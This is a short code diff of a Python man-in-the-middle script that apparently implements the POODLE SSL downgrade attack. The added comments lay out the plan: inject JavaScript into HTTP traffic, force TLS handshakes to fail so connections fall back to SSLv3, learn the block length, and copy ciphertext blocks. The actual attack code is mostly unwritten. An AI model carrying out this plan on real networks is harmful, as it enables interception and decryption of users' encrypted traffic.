@@ -11,7 +11,7 @@ SSL_V3_CODE = 768
 Stage = Enum('Stage', 'downgrade_dance block_length exploit')
 stage = Stage.downgrade_dance
 
-block_size = 16
+block_size = 128 # Assuming AES to start
 
 # for block_length stage
 ciphertext_length = 0
@@ -29,6 +29,16 @@ def copy_block(arr, copy_index, target_index):
 	return arr
 
 def callback(packet):
+
+	# If packet is going to target and packet is http, change packet to inject javascript (initially only once)
+	# If block length unknown and TLS data packet is going from client to server, track lengths until we get block length
+	# If block length known:
+		# If packet is DNS to client, and gives IP of SSL site, keep track of IP of SSL site (optional, only if using name for site)
+		# If packet is from server to client, and is TLS handshake, and is TLS version > SSLv3, change to handshake fail
+		# If packet is TLS data packet from client to server, copy block to end
+	
+
+
 	pkt = IP(packet.get_payload())
 
 	print(pkt.src + " -> " + pkt.dst)
